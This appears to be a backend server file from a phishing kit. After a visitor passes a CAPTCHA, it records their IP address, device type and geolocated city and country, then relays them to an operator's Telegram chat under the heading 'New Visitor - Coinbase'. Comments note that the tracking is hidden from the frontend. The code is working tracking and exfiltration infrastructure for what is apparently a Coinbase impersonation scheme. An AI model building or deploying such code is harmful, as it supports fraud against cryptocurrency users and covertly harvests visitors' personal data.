const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🔍 DETECTION FUNCTIONS (Backend only - NOT exposed in frontend)
// ============================================================================

/**
 * Detect device from User-Agent header
 */
function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

/**
 * Detect region from IP address
 */
async function detectRegion(ip) {
  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    const city = data.city || "Unknown";
    const country = data.country || "Unknown";
    return `${city}, ${country}`;
  } catch (error) {
    console.error("❌ Region detection error:", error.message);
    return "Unknown Region";
  }
}

// ============================================================================
// POST /captcha-success
// Frontend calls this when CAPTCHA is solved
// Backend sends to Telegram
// ============================================================================

app.post("/captcha-success", async (req, res) => {
  try {
    console.log(`\n✅ CAPTCHA SUCCESS RECEIVED`);

    // ============================================================================
    // 🔍 GET DETECTION INFO FROM REQUEST (not frontend)
    // ============================================================================

    // Get IP from request headers (handles proxies)
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    console.log(`   IP: ${ip}`);

    // Get device from User-Agent header
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    console.log(`   Device: ${device}`);

    // Get region from IP using backend service
    const region = await detectRegion(ip);
    console.log(`   Region: ${region}`);

    // Build message
    const message = `❗️<b>New Visitor - Coinbase</b>❗️\n` +
      `\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    // Send to Telegram using bot token from env
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in environment");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      console.log("✅ Message sent to Telegram");
      res.json({ ok: true, message: "CAPTCHA processed" });
    } else {
      console.error("❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// Start server
// ============================================================================

app.listen(PORT, () => {
  console.log(`\n✅ Server running on port ${PORT}`);
  console.log(`📍 URL: ${process.env.APP_URL || `http://localhost:${PORT}`}`);
  console.log(`\n📡 Listening for CAPTCHA submissions...\n`);
});
